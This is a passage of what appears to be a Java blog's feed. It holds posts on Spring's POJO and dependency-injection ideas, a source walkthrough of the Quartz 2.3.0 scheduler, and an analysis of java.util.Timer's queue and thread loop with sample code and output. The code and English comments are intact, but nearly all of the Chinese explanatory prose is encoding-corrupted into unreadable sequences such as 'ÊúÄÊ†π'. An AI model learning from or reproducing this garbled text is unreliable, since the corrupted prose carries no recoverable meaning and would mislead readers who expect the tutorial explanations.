        <content type="html"><![CDATA[<p><strong>SpringÊúÄÊ†πÊú¨ÁöÑ‰ΩøÂëΩ</strong><br><em>ÁÆÄÂåñjavaÂºÄÂèë</em></p><ol><li>Âü∫‰∫éPOJOÁöÑËΩªÈáèÁ∫ßÂíåÊúÄÂ∞è‰æµÂÖ•ÊÄßÁºñÁ®ã </li><li>ÈÄöËøá‰æùËµñÊ≥®ÂÖ•ÂíåÈù¢ÂêëÊé•Âè£ÂÆûÁé∞ÊùæËÄ¶Âêà </li><li>Âü∫‰∫éÂàáÈù¢ÂíåÊÉØ‰æãËøõË°åÂ£∞ÊòéÂºèÁºñÁ®ã </li><li>ÈÄöËøáÂàáÈù¢ÂíåÊ®°ÊùøÂáèÂ∞ëÊ†∑ÊùøÂºè‰ª£Á†Å </li></ol><p>POJOÔºöPlain Ordinary Java Object ÁÆÄÂçïÁöÑjavaÂØπË±°Ôºå<br>ÊòØÊåáÈÇ£‰∫õÊ≤°ÊúâÁªßÊâø‰ªª‰ΩïÁ±ª„ÄÅ‰πüÊ≤°ÊúâË¢´ÂÖ∂‰ªñÊ°ÜÊû∂‰æµÂÖ•ÁöÑjavaÂØπË±°„ÄÇÂΩìÁÑ∂‰∏Ä‰∫õÁ±ªÂÆûÁé∞‰∫ÜSerializableÊé•Âè£ÔºåCloneableÊé•Âè£„ÄÅ„ÄÅÁ≠âÁ≠âÈÉΩÁÆóÊòØPOJO<br>‰∏∫‰ªÄ‰πà‰ºöÊúâPOJOÂë¢ÔºåÂ∞±‰ª•Êàë‰ª¨ÂÖ¨Âè∏ÁöÑ‰æãÂ≠ê‰∏∫‰æãÔºåjavaBeanÈáåÈù¢ÊòØÂçÅÂàÜÂ§çÊùÇÁöÑ„ÄÇËøòÊúâÂê¨ÂâçËæàËØ¥‰ªÄ‰πàEJBÁöÑÁπÅÊùÇ„ÄÇ‰∫éÊòØÂõûÂΩíÁ∫ØÊ¥ÅËÄÅÂºèÁöÑJavaBeanÔºåÂç≥ÊúâÊó†ÊûÑÈÄ†ÂèÇÊï∞ÔºåÊØè‰∏™Â≠óÊÆµÊúâgetterÂíåsetterÁöÑjavaÁ±ª„ÄÇ<br>POJO‰∏çÁî®ÂÆûÁé∞ÂÖ∂‰ªñÊé•Âè£Ôºå‰πüÂ∞±ÊòØ‰æµÂÖ•ÂæàÂ∞ëÁöÑ„ÄÇÂ¶ÇÊûúÊòØxmlÈÖçÁΩÆÁöÑÔºåÂèØ‰ª•Áõ¥Êé•Â∞ÜxmlÂéªÈô§ÊäïÂÖ•ÂÖ∂‰ªñÈ°πÁõÆÔºåÂπ∂‰∏ç‰ºöÂØºËá¥Á®ãÂ∫èÂá∫Áé∞Â§ßÁöÑÁº∫Èô∑„ÄÇ<br><strong>‰æùËµñÊ≥®ÂÖ•</strong><br><em>‰ªª‰Ωï‰∏Ä‰∏™ÊúâÂÆûÈôÖÊÑè‰πâÁöÑÂ∫îÁî®ÈÉΩ‰ºöÁî±‰∏§‰∏™ÊàñËÄÖÂ§ö‰∏™Á±ªÁªÑÊàêÔºåËøô‰∫õÁ±ª‰πãÈó¥ËøõË°åÂçèÂä©Êù•ÂÆåÊàêÁâπÂÆöÁöÑ‰∏öÂä°ÈÄªËæë</em><br><strong>‰º†ÁªüÂÅöÊ≥ï</strong> ÔºöÁõ¥Êé•new‰∏Ä‰∏™ÂØπË±°„ÄÇÁº∫ÁÇπÔºöÈ´òÂ∫¶ËÄ¶ÂêàÔºåÈöæ‰ª•ÊµãËØï<br><strong>‰æùËµñÊ≥®ÂÖ•</strong> ÔºöÂØπË±°ÁöÑ‰æùËµñÂÖ≥Á≥ªÁî±Á≥ªÁªü‰∏≠Ë¥üË¥£ÂçèË∞ÉÂêÑÂØπË±°ÁöÑÁ¨¨‰∏âÊñπÁªÑ‰ª∂Âú®ÂàõÂª∫ÂØπË±°ÁöÑÊó∂ÂÄôËøõË°åËÆæÂÆöÔºåÂØπË±°Êó†ÈúÄËá™Ë°åÂàõÂª∫ÊàñÁÆ°ÁêÜÂÆÉ‰ª¨ÁöÑ‰æùËµñÂÖ≥Á≥ª„ÄÇ<br>springÊòØÈÄöËøáÂ∫îÁî®‰∏ä‰∏ãÊñáÂ∞ÜbeanÂÆö‰πâÔºåÂπ∂ÊääËøô‰∫õbeanÁªÑË£ÖËµ∑Êù•„ÄÇ‰ºòÁÇπÔºö<br>ÊùæËÄ¶ÂêàÔºåÊòìÊµãËØï„ÄÇÂÖ∑‰ΩìÊµãËØïÔºåËøô‰∏™Âú∞ÊñπÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®mockito-coreËøô‰∏™ÂåÖÁ≠âÁ≠âÔºåÂè™ÊòØ‰∏æ‰∏™Ê†óÂ≠ê„ÄÇ</p><p>Â•Ω‰∫ÜÔºå‰∏ãÈù¢ÂÖ≥‰∫éaop‰πãÁ±ªÁöÑ‰ø°ÊÅØÔºåÂÜçÈöèÂêéÁöÑÊó•Â≠êÈáå‰ºöËøõË°å‰ªãÁªçÔºå‰ªäÂ§©Â∞±‰ªãÁªç‰∏Ä‰∏ãiocÁöÑÂ§ßÊ¶ÇÊÑèÊÄù</p>]]></content>
      
      
      
        <tags>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>quartzÊ∫êÁ†ÅÈòÖËØªÔºà‰∏ÄÔºâÔºåÂÖàÂºÄÂùë</title>
      <link href="/2018/10/10/quartz%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%8C%E5%85%88%E5%BC%80%E5%9D%91/"/>
      <url>/2018/10/10/quartz%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%8C%E5%85%88%E5%BC%80%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>È¶ñÂÖàÔºåÊàë‰ΩøÁî®ÁöÑquartzÁöÑÁâàÊú¨</p><pre><code>&lt;dependency&gt;      &lt;groupId&gt;org.quartz-scheduler&lt;/groupId&gt;      &lt;artifactId&gt;quartz&lt;/artifactId&gt;      &lt;version&gt;2.3.0&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>È¶ñÂÖàÔºåmainÂáΩÊï∞</p><pre><code>  public static void main(String[] args) throws SchedulerException {        //1.ÂàõÂª∫schedulerFactoryÁöÑÂ∑•ÂéÇ        SchedulerFactory schedulerFactory = new StdSchedulerFactory();        //2.‰ªéÂ∑•ÂéÇ‰∏≠Ëé∑ÂèñË∞ÉÂ∫¶Âô®ÂÆû‰æã        Scheduler scheduler = schedulerFactory.getScheduler();        //ÂàõÂª∫JobDetail        JobDetail jobDetail = JobBuilder.newJob(RAMJob.class)                .withDescription(&quot;this is a ram job&quot;)                .withIdentity(&quot;ramjob&quot;,&quot;ramGroup&quot;)                .build();        //‰ªªÂä°ËøêË°åÁöÑÊó∂Èó¥ÔºåsimpleSchedleÁ±ªÂûãËß¶ÂèëÂô®ÊúâÊïà        long time = System.currentTimeMillis() + 3 * 1000L;        Date startTime = new Date(time);        //ÂàõÂª∫Trigger            //‰ΩøÁî®SimpleScheduleBuilderÊàñËÄÖCronSchedulerBuilder        Trigger trigger = TriggerBuilder.newTrigger()                .withDescription(&quot;Ëß¶ÂèëÂô®&quot;)                .withIdentity(&quot;ramTrigger&quot;,&quot;ramTriggerGroup&quot;)                .startAt(startTime)                .withSchedule(CronScheduleBuilder.cronSchedule(&quot;0/2 * * * * ?&quot;))                .build();        //Ê≥®ÂÜå‰ªªÂä°ÂíåÂÆöÊó∂Âô®        scheduler.scheduleJob(jobDetail,trigger);        //ÂêØÂä®Ë∞ÉÂ∫¶Âô®        scheduler.start();        log.info(&quot;ÂêØÂä®Êó∂Èó¥Ôºö&quot;+sdf.format(new Date()));    }SchedulerFactory schedulerFactory = new StdSchedulerFactory();ÂàõÂª∫‰Ωú‰∏öË∞ÉÂ∫¶ÁöÑÂ∑•ÂéÇÁ±ªÔºöÈ¶ñÂÖàÁúãStdSchedulerFactoryconstantsÔºöÂèòÈáèÂ§™Â§ö‰∫ÜÔºåÁ≠â‰ºöÁî®Âà∞ÂÜçÊù•ÁúãconstructorsÔºöÊûÑÈÄ†ÊñπÊ≥ï/**ÁîüÊàê‰∏Ä‰∏™Ê≤°ÊúâÊú™ÂàùÂßãÂåñÁöÑStdSchedulerFactory*/public StdSchedulerFactory()/**‰∏ãÈù¢Ëøô‰∏§‰∏™ÔºåÂÖ∂ÂÆûÊòØ‰∏Ä‰∏™Áõ¥Êé•ÁöÑPropertiesÁ±ªÂûãÁöÑÔºåÂè¶‰∏Ä‰∏™ÊòØËøô‰∏™propertiesÁöÑfileNameÔºåÂÖ∂ÂÆûÂ∞±ÊòØÈÄöËøáInputStreamËß£ÊûêËøô‰∏™Êñá‰ª∂Â∞ÜÂ∞ÅË£Ö‰∏Ä‰∏™Âá∫propertiesÔºåÊúÄÂêéËøòÊòØÈÄöËøá initialize(props);ÁªôÂèòÈáèÔºöprivate PropertiesParser cfgÔºõËµãÂÄºthis.cfg = new PropertiesParser(props);*/public StdSchedulerFactory(Properties props) throws SchedulerException {        initialize(props);}public StdSchedulerFactory(String fileName) throws SchedulerException {        initialize(fileName);    }</code></pre><p><a href="//2.xn--fiq1oks00kbml1k2ylevez0bdx6qucta" target="_blank" rel="noopener"> //2.‰ªéÂ∑•ÂéÇ‰∏≠Ëé∑ÂèñË∞ÉÂ∫¶Âô®ÂÆû‰æã </a></p><pre><code>        Scheduler scheduler = schedulerFactory.getScheduler();  public Scheduler getScheduler() throws SchedulerException {        if (cfg == null) {            initialize();//Ê≠§Ê¨°‰ºöÂéªËß£ÊûêÊòØÂê¶Êúâquartz.protertiesÊñá‰ª∂ÔºåÂ¶ÇÊûúÊúâÂàôÁî®‰Ω†ÁöÑÔºåÂ¶ÇÊûúÊ≤°ÊúâÔºåÈÇ£Â∞±‰ºöÁî®‰ªñjarÂåÖ‰∏≠ÁöÑ            Âú®org/quartz/quartz.properties            /**            By default a properties file named &quot;quartz.properties&quot; is loaded from     * the &apos;current working directory&apos;. If that fails, then the     * &quot;quartz.properties&quot; file located (as a resource) in the org/quartz     * package is loaded. If you wish to use a file other than these defaults,     * you must define the system property &apos;org.quartz.properties&apos; to point to     * the file you want.     */     //quartz.properties‰∏≠Â§ßËá¥Ê∂âÂèäÔºöÁ∫øÁ®ãÊ±†‰∏≠ÁöÑÁ∫øÁ®ãÊï∞ÔºåÁ∫øÁ®ã‰ºòÂÖàÁ∫ßÔºåÂÖ∑‰ΩìÂèØ‰ª•Áúã    // https://www.jianshu.com/p/14f86c6efe22        }        SchedulerRepository schedRep = SchedulerRepository.getInstance();        Scheduler sched = schedRep.lookup(getSchedulerName());        if (sched != null) {            if (sched.isShutdown()) {                schedRep.remove(getSchedulerName());            } else {                return sched;            }        }        sched = instantiate();        return sched;    }    //‰ºöÁîüÊàê‰∏Ä‰∏™SchedulerÊé•Âè£ÂÆûÁé∞ÁöÑÁöÑStdScheduler    Âú®StdScheduler‰∏≠Êúâ‰∏™ÂèòÈáèÔºö    private QuartzScheduler sched;    This is the heart of Quartz, an indirect implementation of the &lt;code&gt;{@link org.quartz.Scheduler}&lt;/code&gt;    quartzÁöÑ‰∏≠ÂøÉÔºåÈó¥Êé•ÁöÑÂÆûÁé∞‰∫ÜSchedulerÊé•Âè£    StdSchedulerÈáåÈù¢ÁöÑË∞ÉÁî®ÊñπÊ≥ïÔºåÈÉΩÊòØ‰ΩøÁî®QuartzSchedulerÈáåÈù¢ÁöÑÊñπÊ≥ï    ÂàíÈáçÁÇπQuartzSchedulerËøô‰∏™Á±ªÔºåÊúâÁÇπÂ§çÊùÇÔºåÂêéÈù¢ÂÜçËÆ≤    ‰∏ãÈù¢ÁúãJobDetail    ÂÖ≥‰∫éJobdetailÂíåTriggerÁöÑ‰ªãÁªç    /**Quartz does not store an actual instance of a &lt;code&gt;Job&lt;/code&gt; class, but * instead allows you to define an instance of one, through the use of a &lt;code&gt;JobDetail&lt;/code&gt;. quartz‰∏≠‰∏ç‰øùÂ≠ò‰∏Ä‰∏™ÁúüÂÆûÁöÑjobÁ±ªÔºå‰ΩÜÊòØÂèØ‰ª•ÈÄöËøájobdetailÊù•ÂÆö‰πâ‰∏Ä‰∏™ÂÆû‰æã * &lt;code&gt;Job&lt;/code&gt;s have a name and group associated with them, which * should uniquely identify them within a single &lt;code&gt;{@link Scheduler}&lt;/code&gt;. jobÈúÄË¶Å‰∏Ä‰∏™nameÂíågroupÊù•ÂÖ≥ËÅî‰ªñ‰ª¨Ôºå  &lt;code&gt;Trigger&lt;/code&gt;s are the &apos;mechanism&apos; by which &lt;code&gt;Job&lt;/code&gt;s * are scheduled. Many &lt;code&gt;Trigger&lt;/code&gt;s can point to the same &lt;code&gt;Job&lt;/code&gt;, * but a single &lt;code&gt;Trigger&lt;/code&gt; can only point to one &lt;code&gt;Job&lt;/code&gt;.Ëß¶ÂèëÂô®ÊòØjobsÁöÑË∞ÉÂ∫¶ÁöÑÊú∫Âà∂„ÄÇ‰∏Ä‰∏™jobÂèØ‰ª•ÂØπÂ∫îÂ§ö‰∏™TriggerÔºå‰ΩÜÊòØtriggerÂè™ÂèØ‰ª•ÂØπÂ∫î‰∏Ä‰∏™job    */</code></pre><p>//ÂàõÂª∫JobDetail</p><pre><code>JobDetail jobDetail = JobBuilder.newJob(RAMJob.class)               .withDescription(&quot;this is a ram job&quot;)               .withIdentity(&quot;ramjob&quot;,&quot;ramGroup&quot;)               .build();‰ΩøÁî®ÊûÑÈÄ†Âô®Ê®°ÂºèÔºö    Êñ∞Âª∫‰∏Ä‰∏™JobDetailImpl</code></pre><p>//ÂàõÂª∫Trigger</p><pre><code>     //‰ΩøÁî®SimpleScheduleBuilderÊàñËÄÖCronSchedulerBuilder        Trigger trigger = TriggerBuilder.newTrigger()                .withDescription(&quot;Ëß¶ÂèëÂô®&quot;)                .withIdentity(&quot;ramTrigger&quot;,&quot;ramTriggerGroup&quot;)                .startAt(startTime)                .withSchedule(CronScheduleBuilder.cronSchedule(&quot;0/2 * * * * ?&quot;))                .build();ÂÖ∂‰∏≠Âú®TriggerBuilder‰∏≠ÁöÑwithSchedule()ÊñπÊ≥ï/**     * Set the {@link ScheduleBuilder} that will be used to define the      * Trigger&apos;s schedule.     *      * &lt;p&gt;The particular &lt;code&gt;SchedulerBuilder&lt;/code&gt; used will dictate     * the concrete type of Trigger that is produced by the TriggerBuilder.&lt;/p&gt;     * @param schedBuilder the SchedulerBuilder to use.     * @return the updated TriggerBuilder     * @see ScheduleBuilder     * @see SimpleScheduleBuilder     * @see CronScheduleBuilder     * @see CalendarIntervalScheduleBuilder     *      ÊòØÊ†πÊçÆÈáåÈù¢ÔºåÊù•Á°ÆÂÆöTriggerÊé•Âè£ÂÆûÁé∞Á±ªÁöÑÁ±ªÂûãÂÖ∂‰∏≠ÔºåËøô‰∏™cronÈáåÈù¢ÁöÑËß£Êûê&quot;0/2 * * * * ?&quot;ÔºöÊòØÈÄöËøáCronExpression.java‰∏≠ÁöÑbuildExpressionÊñπÊ≥ïÊù•Ëß£ÊûêÁöÑÂú®CronTriggerImpl‰∏≠‰ºö@Deprecated    public CronTriggerImpl(String name, String group, String cronExpression)        throws ParseException {        super(name, group);//nameÂíågroup        setCronExpression(cronExpression);//Ëß£ÊûêcronÂ≠óÁ¨¶‰∏≤        setStartTime(new Date());//ÂΩìÂâçÊó∂Èó¥        setTimeZone(TimeZone.getDefault());//ÂΩìÂâçÊó∂Âå∫    }</code></pre><p>//Ê≥®ÂÜå‰ªªÂä°ÂíåÂÆöÊó∂Âô®</p><pre><code>scheduler.scheduleJob(jobDetail,trigger);ÂÖ∂ÂÆûÊòØË∞ÉÁî®ÁöÑÊòØQuartzScheduler‰∏≠ÁöÑ public Date scheduleJob(JobDetail jobDetail,            Trigger trigger) throws SchedulerExceptionÊñπÊ≥ï  resources.getJobStore().storeJobAndTrigger(jobDetail, trig);//Â≠òÂÇ®job and triggerÂà∞jobStore        notifySchedulerListenersJobAdded(jobDetail);//Ê∑ªÂä†jobDetailÂà∞Ë∞ÉÂ∫¶ÁõëÂê¨Âô®        notifySchedulerThread(trigger.getNextFireTime().getTime());//ÈÄöÁü•Ë∞ÉÂ∫¶Âô®‰∏ã‰∏ÄÂàªË∞ÉÂ∫¶Êó∂Èó¥        notifySchedulerListenersSchduled(trigger);//Ê∑ªÂä†triggerÂà∞Ë∞ÉÂ∫¶ÁõëÂê¨Âô®</code></pre><p>//ÂêØÂä®Ë∞ÉÂ∫¶Âô®</p><pre><code>scheduler.start();public void start() throws SchedulerException {       if (shuttingDown|| closed) {           throw new SchedulerException(                   &quot;The Scheduler cannot be restarted after shutdown() has been called.&quot;);       }       // QTZ-212 : calling new schedulerStarting() method on the listeners       // right after entering start()       notifySchedulerListenersStarting();//ÈÄöÁü•Ë∞ÉÂ∫¶ÁõëÂê¨Âô®Ê≠£Âú®ÂêØÂä®       if (initialStart == null) {           initialStart = new Date();           this.resources.getJobStore().schedulerStarted(); //                      startPlugins();       } else {           resources.getJobStore().schedulerResumed();       }       schedThread.togglePause(false);       getLog().info(               &quot;Scheduler &quot; + resources.getUniqueIdentifier() + &quot; started.&quot;);       notifySchedulerListenersStarted();//ÈÄöÁü•Ë∞ÉÂ∫¶ÁõëÂê¨Âô®Â∑≤ÁªèÂêØÂä®   }</code></pre><p>start()Ëøô‰∏™ÊñπÊ≥ïÊòéÂ§©ÂÜçÁúãÔºåÂõûÂéªÁúãQGhappy vs BAÈªëÂá§Ê¢®<br>2018.10.10ÂçñËêåÊó•</p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TimerÂÆöÊó∂Ë∞ÉÁî®</title>
      <link href="/2018/09/18/Timer%E5%AE%9A%E6%97%B6%E8%B0%83%E7%94%A8/"/>
      <url>/2018/09/18/Timer%E5%AE%9A%E6%97%B6%E8%B0%83%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="1-ÂÖ∑‰ΩìÂÆû‰æã"><a href="#1-ÂÖ∑‰ΩìÂÆû‰æã" class="headerlink" title="1. ÂÖ∑‰ΩìÂÆû‰æã"></a>1. ÂÖ∑‰ΩìÂÆû‰æã</h2><pre><code>ÁªßÊâøTimerTaskÊäΩË±°Á±ªÂÆûÁé∞‰∏§‰∏™Â≠êÁ±ªTimerJobÂíåTimerJob2package com.husky.timer;import java.text.SimpleDateFormat;import java.util.Date;import java.util.TimerTask;/** * @author husky * @date 2018/9/17 9:41 */public class TimerJob extends TimerTask {    @Override    public void run() {        System.out.println(&quot;ÂΩìÂâçÊâßË°åÁöÑ‰ªªÂä°ÊòØTimerJob&quot;);        Date date = new Date();        SimpleDateFormat sf = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);        System.out.println(&quot;Current time : &quot;+sf.format(date));        System.out.println(&quot;ÂΩìÂâçÁ∫øÁ®ãÔºö &quot;+Thread.currentThread().getName());    }}package com.husky.timer;import java.text.SimpleDateFormat;import java.util.Date;import java.util.TimerTask;/** * @author husky * @date 2018/9/17 10:40 */public class TimerJob2 extends TimerTask {    @Override    public void run() {        System.out.println(&quot;ÂΩìÂâçÊâßË°åÁöÑ‰ªªÂä°ÊòØTimerJob2&quot;);        Date date = new Date();        SimpleDateFormat sf = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);        System.out.println(&quot;Current time : &quot;+sf.format(date));        System.out.println(&quot;ÂΩìÂâçÁ∫øÁ®ãÔºö &quot;+Thread.currentThread().getName());    }}</code></pre><p>ÊµãËØïÁ±ª</p><pre><code>public class TimerRun {    public static void main(String[] args) {        Date date = new Date();        SimpleDateFormat sf = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);        System.out.println(&quot;Current time:&quot;+sf.format(date));        System.out.println(Thread.currentThread().getName());        System.out.println(&quot;ÂºÄÂßãÊâßË°åÂÆöÊó∂‰ªªÂä°=======&quot;);        Timer timer = new Timer();        TimerJob timerJob = new TimerJob();        TimerJob2 timerJob2 = new TimerJob2();        timer.schedule(timerJob,3000,2000);        timer.schedule(timerJob2,5000,3000);    }}/**ËøêË°åÁªìÊûúÔºöCurrent time:2018-09-18 16:11:08mainÂºÄÂßãÊâßË°åÂÆöÊó∂‰ªªÂä°=======ÂΩìÂâçÊâßË°åÁöÑ‰ªªÂä°ÊòØTimerJobCurrent time : 2018-09-18 16:11:11ÂΩìÂâçÁ∫øÁ®ãÔºö Timer-0ÂΩìÂâçÊâßË°åÁöÑ‰ªªÂä°ÊòØTimerJobCurrent time : 2018-09-18 16:11:13ÂΩìÂâçÁ∫øÁ®ãÔºö Timer-0ÂΩìÂâçÊâßË°åÁöÑ‰ªªÂä°ÊòØTimerJob2Current time : 2018-09-18 16:11:13ÂΩìÂâçÁ∫øÁ®ãÔºö Timer-0ÂΩìÂâçÊâßË°åÁöÑ‰ªªÂä°ÊòØTimerJobCurrent time : 2018-09-18 16:11:15ÂΩìÂâçÁ∫øÁ®ãÔºö Timer-0ÂΩìÂâçÊâßË°åÁöÑ‰ªªÂä°ÊòØTimerJob2Current time : 2018-09-18 16:11:16ÂΩìÂâçÁ∫øÁ®ãÔºö Timer-0*/</code></pre><h2 id="ÂÖ∑‰ΩìÊ∫êÁ†ÅÂàÜÊûêÔºö"><a href="#ÂÖ∑‰ΩìÊ∫êÁ†ÅÂàÜÊûêÔºö" class="headerlink" title="ÂÖ∑‰ΩìÊ∫êÁ†ÅÂàÜÊûêÔºö"></a>ÂÖ∑‰ΩìÊ∫êÁ†ÅÂàÜÊûêÔºö</h2><pre><code>È¶ñÂÖàÂàÜÊûêTimerÔºö</code></pre><ol><li><p>ÊàêÂëòÂèòÈáè </p><pre><code>private final TaskQueue queue = new TaskQueue();</code></pre><p>   //ËØ•ÂØπË±°ÊòØÂ∞ÅË£Ö‰∫ÜTimerTaskÁöÑÊï∞ÁªÑÔºåÂÆûÁé∞Á±ª‰ºº‰∫élist<br>   /**class TaskQueue {</p><pre><code>private TimerTask[] queue = new TimerTask[128];private int size = 0;ËØ•ÂØπË±°‰πüÂèØ‰ª•ÈÄöËøá‰ªñÁöÑaddÊñπÊ≥ïÔºåËøõË°åÊï∞ÁªÑÊâ©ÂÆπ</code></pre><p>   */ </p><pre><code>private final TimerThread thread = new TimerThread(queue);//Ëøô‰∏™Á∫øÁ®ãÊòØÁ≠âÂæÖtimerqueue‰∏äÁöÑtaskÔºåÊâßË°å‰∏ÄÊ¨°‰ªªÂä°ÔºåÈáçÂ§çÊâßË°å‰ªªÂä°Ôºå‰ª•ÂèäÁßªÈô§‰∏Ä‰∫õ‰ªªÂä°//Ëøô‰∏™Á±ªÂæàÈáçË¶ÅÔºåÁ≠â‰ºöÂÖ∑‰ΩìÂàÜÊûê</code></pre></li></ol><ol start="2"><li>ÊûÑÈÄ†ÂáΩÊï∞ </li></ol><pre><code>public Timer() {        this(&quot;Timer-&quot; + serialNumber());    }    public Timer(boolean isDaemon) {        this(&quot;Timer-&quot; + serialNumber(), isDaemon);    }    public Timer(String name) {        thread.setName(name);        thread.start();    }    public Timer(String name, boolean isDaemon) {        thread.setName(name);        thread.setDaemon(isDaemon);        thread.start();//‰ªéËøôÂÑøÂèØ‰ª•ÁúãÂá∫ÔºåÂêØÂä®‰∫ÜTimerThreadÁ∫øÁ®ã    }</code></pre><ol start="3"><li>ÈáçË¶ÅÊñπÊ≥ï </li></ol><pre><code> public void schedule(TimerTask task, long delay, long period) {        if (delay &lt; 0)            throw new IllegalArgumentException(&quot;Negative delay.&quot;);        if (period &lt;= 0)            throw new IllegalArgumentException(&quot;Non-positive period.&quot;);        sched(task, System.currentTimeMillis()+delay, -period);    }    //Ê≠§Â§ÑÂ∞ÜdelayÂä†‰∏äÂΩìÂâçÊó∂Èó¥ÔºåËé∑ÂèñÊâßË°åÊó∂Èó¥private void sched(TimerTask task, long time, long period) {        if (time &lt; 0)            throw new IllegalArgumentException(&quot;Illegal execution time.&quot;);        // Constrain value of period sufficiently to prevent numeric        // overflow while still being effectively infinitely large.        if (Math.abs(period) &gt; (Long.MAX_VALUE &gt;&gt; 1))            period &gt;&gt;= 1;        synchronized(queue) {            if (!thread.newTasksMayBeScheduled)                throw new IllegalStateException(&quot;Timer already cancelled.&quot;);            synchronized(task.lock) {                if (task.state != TimerTask.VIRGIN)                    throw new IllegalStateException(                        &quot;Task already scheduled or cancelled&quot;);                task.nextExecutionTime = time;                task.period = period;                task.state = TimerTask.SCHEDULED;            }            queue.add(task);//Â∞ÜTimerTaskÁöÑÂ≠êÁ±ªÊîæÂÖ•Âà∞TimerQueue‰∏≠            if (queue.getMin() == task)                queue.notify();        }    }</code></pre><p><strong>Â•Ω‰∫ÜÔºå‰∏äÈù¢ÂÆûÁé∞‰∫ÜÊ∑ªÂä†‰ªªÂä°Ôºå‰∏ãÈù¢Â∞±ÊòØÊâßË°å‰∫ÜÔºåÊàë‰ª¨Êù•ÂàÜÊûêTimerThread</strong></p><ol><li>Â§ßËá¥ </li></ol><pre><code>class TimerThread extends Thread {    boolean newTasksMayBeScheduled = true;    private TaskQueue queue;    TimerThread(TaskQueue queue) {        this.queue = queue;    }    public void run() {        try {            mainLoop();        } finally {            // Someone killed this Thread, behave as if Timer cancelled            //ÊÑèÂ§ñÊùÄÊ≠ª‰∫ÜÁ∫øÁ®ãÔºåË°®Áé∞ÁöÑÂÉèTimerÊ≥®ÈîÄ            synchronized(queue) {                newTasksMayBeScheduled = false;                queue.clear();  // Eliminate obsolete references            }        }    }</code></pre><ol start="2"><li>ÂÖ∑‰ΩìÂàÜÊûêmainLoopÊñπÊ≥ï </li></ol><pre><code>private void mainLoop() {       while (true) {           try {               TimerTask task;               boolean taskFired;               synchronized(queue) {                   // Wait for queue to become non-empty                   while (queue.isEmpty() &amp;&amp; newTasksMayBeScheduled)                       queue.wait();                   if (queue.isEmpty())                       break; // Queue is empty and will forever remain; die                       //Â¶ÇÊûú‰∏ÄÁõ¥Ê≤°ÊúâtaskËøõÂÖ•Êï∞ÁªÑÔºådie                   // Queue nonempty; look at first evt and do the right thing                   long currentTime, executionTime;                   task = queue.getMin();                   //Ëé∑ÂèñTimerQueue‰∏≠ÊúÄÂâçÁöÑtaskÔºå‰πüÂ∞±ÊòØÊâßË°åÊó∂Èó¥ÊúÄËøëÁöÑ                   synchronized(task.lock) {                       if (task.state == TimerTask.CANCELLED) {                           queue.removeMin();                           continue;  // No action required, poll queue again                       }                       currentTime = System.currentTimeMillis();                       executionTime = task.nextExecutionTime;                       if (taskFired = (executionTime&lt;=currentTime)) {                           if (task.period == 0) { // Non-repeating, remove//Âà§Êñ≠ÊòØÂê¶Ë¶ÅÈáçÂ§çÊâßË°åÔºå‰∏çÈúÄË¶ÅÁõ¥Êé•remove                               queue.removeMin();                               task.state = TimerTask.EXECUTED;//Êõ¥ÊîπtaskÁä∂ÊÄÅ                           } else { // Repeating task, reschedule                               queue.rescheduleMin(                                 task.period&lt;0 ? currentTime   - task.period                                               : executionTime + task.period);//Êõ¥ÊîπÈáçÂ§çÊâßË°åÁöÑtaskÁöÑ‰∏ã‰∏ÄÊ¨°ÁöÑËøêË°åÊó∂Èó¥                           }                       }                   }                   if (!taskFired) // Task hasn&apos;t yet fired; wait//Â¶ÇÊûúËøòÊ≤°Âà∞ÊâßË°åÊó∂Èó¥ÔºåÁ≠âÂæÖ                       queue.wait(executionTime - currentTime);               }               if (taskFired)  // Task fired; run it, holding no locks                   task.run();//taskËøêË°å                    //ÔºåËøôËæπ‰ΩøÁî®ÁöÑÊòØrunÔºàÔºâËÄå‰∏çÊòØstartÔºàÔºâÔºå‰πüÂ∞±ÊòØËØ¥runÊñπÊ≥ïÊòØÁÆÄÂçïÁöÑÊñπÊ≥ïÔºåË¶ÅÊåâÁÖßÈ°∫Â∫èÊâßË°åÔºåËÄå‰∏çÊòØÁ∫øÁ®ãÁöÑrunÊñπÊ≥ï,Âú®Ëøô‰∏™Âú∞ÊñπÂπ∂Ê≤°ÊúâÂØπrunÊñπÊ≥ïËøõË°åtry/catch           } catch(InterruptedException e) {           }       }   }</code></pre><p><strong>Áº∫Èô∑ÂàÜÊûê</strong><br>TimerÊòØÂçïÁ∫øÁ®ã<br>Ê°à‰æãÔºö<br>Êúâ‰∏§‰∏™ÈáçÂ§ç‰ªªÂä°Ôºàrepeat taskÔºâÔºåtask1Ê≠£Â∏∏‰ªªÂä°Ôºåtask2‰ºöÊäõÂá∫ÂºÇÂ∏∏ÔºåÁ¨¨‰∏Ä‰∏™ÊòØÂÖàÊâßË°åÁöÑÔºåËÄåÁ¨¨‰∫å‰∏™ÂêéÊâßË°åÁöÑÔºåÂ¶ÇÊûúÊ≠£Â∏∏ÊâßË°åÔºåÊâßË°åÁöÑÈ°∫Â∫è<br>task1 Ôºåtask1 Ôºåtask2Ôºåtask1 